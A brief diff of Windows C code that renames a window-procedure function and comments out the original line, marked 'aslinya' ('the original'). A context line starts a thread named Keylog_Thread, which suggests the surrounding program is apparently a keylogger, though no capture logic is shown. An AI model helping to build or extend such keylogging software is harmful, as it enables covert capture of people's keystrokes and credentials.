@@ -98,7 +98,9 @@ CreateThread(NULL, 0, &Keylog_Thread, NULL, 0, &id);
     return messages.wParam;
 }
 
-LRESULT CALLBACK WindowsProcedure (HWND hwnd, UINT message,
+// aslinya
+//LRESULT CALLBACK WindowsProcedure (HWND hwnd, UINT message,
+LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message,
                                    WPARAM wParam,
                                    LPARAM lParam)
 {
